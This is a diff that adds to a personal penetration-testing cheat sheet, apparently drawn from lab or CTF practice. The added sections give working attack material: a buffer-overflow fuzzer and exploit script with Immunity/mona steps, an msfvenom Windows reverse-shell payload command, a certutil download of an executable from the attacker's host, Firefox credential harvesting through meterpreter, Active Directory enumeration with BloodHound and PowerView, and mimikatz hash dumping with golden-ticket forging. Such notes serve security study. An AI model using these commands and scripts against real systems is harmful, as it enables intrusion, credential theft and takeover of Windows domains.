@@ -91,6 +91,10 @@ ftp <IP>
 username : anonymous
 ```
 
+If error code 229, `ftp> passive`
+
+If cannot download completely, try `ftp> binary`
+
 ### FTP ProFtpd
 
 - copy files/directories from one place to another on the server 
@@ -438,9 +442,137 @@ initial access - [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nisha
   Start-Process "shell-name.exe"
   ```
 
+- transfer files
+
+  python http.server on kali, then on windows command line, 
+
+  ```
+  certutil -urlcache -f http://$your_ip/chatserver.exe chatserver.exe
+  ```
+
+  
+
+### RDP
+
+```bash
+xfreerdp /u:admin /p:password /cert:ignore /v:10.10.227.138 /workarea
+```
+
+
+
 ### Buffer Overflow
 
 [Tutorial](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)
+
+fuzzer.py
+
+```python
+import socket, time, sys
+
+ip = "<IP>"
+port = <port>
+timeout = 5
+
+buffer = []
+counter = 100
+while len(buffer) < 30:
+    buffer.append("A" * counter)
+    counter += 100
+
+for string in buffer:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((ip, port))
+
+        print("Fuzzing with %s bytes" % len(string))
+        s.send(bytes(string + "\r\n", "latin-1"))
+        s.close()
+    except:
+        print("Could not connect to " + ip + ":" + str(port))
+        sys.exit(0)
+    time.sleep(1)
+```
+
+exploit.py
+
+```python
+import socket
+
+ip = "<IP>"
+port = <port>
+
+overflow = "A" * <offset> + "<address>" + <additional no-ops such as "\x90" * 32>
+payload = ("<payload>")
+message = overflow + payload
+
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    print("Sending evil buffer...")
+    s.send(bytes(message + "\r\n", "latin-1"))
+    print("Done!")
+except:
+    print("Could not connect.")
+```
+
+If you need to receive data, add s.recv(1024)
+
+
+
+Setup Mona
+
+```
+!mona config -set workingfolder c:\mona\%p
+```
+
+Send patterned texts to buffer overflow
+
+```bash
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <num>
+```
+
+Check offset with EIP
+
+```bash
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP>
+```
+
+Send "A" * offset + "B" * 4 and make sure EIP is 42424242
+
+Generate badarray with mona in Immunity debugger
+
+```
+!mona bytearray -b "\x00<and other bad char>"
+```
+
+Send all chars as payload and see which is bad char
+
+```
+for x in range(1, 256):
+    print("\\x" + "{:02x}".format(x), end='')
+```
+
+```
+!mona compare -f C:\mona\appname\bytearray.bin -a <ESP>
+```
+
+Find jmp esp
+
+```
+!mona jmp -r esp -cpb "\x00<and other bad chars>"
+```
+
+Make payload
+
+```
+ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<port> EXITFUNC=thread -b "\x00<and other bad chars>" -f c
+```
+
+Also you can use windows/meterpreter/reverse_tcp and get shell with multi/handler.(Don't forget to set payload!)
+
+
 
 ### meterpreter
 
@@ -540,6 +672,24 @@ After obtain NT hashes, use **evil-winrm**
 
 
 
+### Gather creds in firefox w/meterpreter
+
+after get meterpreter shell, 
+
+```
+meterpreter> run post/multi/gather/firefox_creds
+```
+
+Change the file names to correct one... Ex. cert9.db, logins.json
+
+Then, use [python script ](https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py) 
+
+```
+python3 firefox_decrypt.py <file path> 
+```
+
+use rpc or psexec in impacket to login
+
 ## Attack Kerberos
 
 Attack Privilege Requrements-
@@ -554,7 +704,9 @@ Attack Privilege Requrements-
 
 
 
-### Enumeration w/ Kerbrute
+### Enumeration
+
+#### Kerbrute
 
 Add victim IP to /etc/hosts as CONTROLLER.local (DNS_Domain_Name in nmap)
 
@@ -565,6 +717,60 @@ On attacker machine,
 ```
 
 
+
+#### BloodHound
+
+GUI similar to PowerView
+
+```bash
+powershell -ep bypass
+. .\Downloads\SharpHound.ps1
+Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
+```
+
+transfer zip to attacker machine
+
+#### PowerView
+
+- Server Manager
+
+  Use windows built in Server Manager
+
+  enumerate domain after gained shell
+
+  ```shell
+  powershell -ep bypass
+  ```
+
+  ```powershell
+  . .\PowerView.ps1
+  ```
+
+  - Enumerate domain users
+
+    ```powershell
+    Get-NetUser | select cn
+    ```
+
+  - Enumerate domain groups
+
+    ```powershell
+    Get-NetGroup -GroupName *admin*
+    ```
+
+  - Shared folder
+
+    ```powershell
+    Invoke-ShareFinder
+    ```
+
+  - Operating system
+
+    ```powershell
+    Get-NetComputer -fulldata | select operatingsystem
+    ```
+
+  ### 
 
 ### Harvesting & Brute-Forcing Tickets w/ Rubeus
 
@@ -684,6 +890,8 @@ dump the hash as well as  the security identifier needed to create a Golden Tick
 lsadump::lsa /inject /name:krbtgt
 ```
 
+or `lsadump::lsa /patch` to dump hashes for users
+
 #### Create a Golden/Silver Ticket
 
 Creating a golden ticket. To create a silver ticket simply put a service NTLM hash into the krbtgt  slot, the sid of the service account into sid, and change the id to  1103.
@@ -691,6 +899,12 @@ Creating a golden ticket. To create a silver ticket simply put a service NTLM ha
 ```
 Kerberos::golden /user:Administrator /domain:controller.local /sid:<sid> /krbtgt:<ticket> /id:<id>
 ```
+
+<sid>: after Domain part, ex. S-1-5-21-849420856-2351964222-986696166
+
+<ticket>:  * Primary NTLM, ex. 5508500012cc005cf7082a9a89ebdfdf
+
+<id>: Ex. 500
 
 #### Use the Golden/Silver Ticket to access other machines
 
